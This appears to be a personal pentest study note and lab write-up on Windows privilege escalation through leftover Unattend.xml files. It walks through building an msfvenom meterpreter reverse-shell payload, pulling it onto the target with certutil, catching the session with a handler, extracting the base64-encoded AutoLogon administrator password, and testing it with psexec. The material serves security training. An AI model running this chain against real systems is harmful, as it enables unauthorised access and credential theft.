
Related to [[Windows Password Hashes]] and [[Post Exploitation]]

Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.

This is typically done through the use of Unattended Windows Setup utility, which is used to automate the mass install/deployment of Windows on system.

These tool config files contain specific configs and user account credentials, specifically the Administrators password.

If the UWS config files are left on a target after an install they can reveal information an attacker may use.

We can find unattend.xml manually with rdp but we may also use a meterpreter session

---

This is a writeup of the lab:

(To create a Windows msfvenom payload for [[Metasploit]])

``` bash
msfvenom -p windows/x[arch]/meterpreter/reverse_tcp LHOST=[lIP] LPORT=[lIP] -f exe > payload.exe
```

Then setup a python http server to host the payload:

``` bash
python -m SimpleHTTPServer 80
```

Then download it from the target system:

``` bash
certutil -urlcache http://[lIP]/[filepath] [output/savefile]
```

We then need to setup the multi handler on the attacker machine:

``` bash
service postgresql start && msfconsole
use multi/handler
set PAYLOAD [payload]
set lPORT [lIP]
set LHOST [lIP]
```

Then run the payload on the victim machine

Now we can use the search utility:

``` bash
search -f Unattend.xml
```

(Or search manually, in this case it's on C://Windows/Panther)

``` bash
download Unattend.xml
```

Then we search for 

```
<AutoLogon>
```

which should contain administrators password.
It may be encoded in base64

``` bash
base64 -d [passfile]
```

We can discover if the password is correct using psexec:

``` bash
psexec.py administrator@rIP
```

And inserting the passwords when prompted.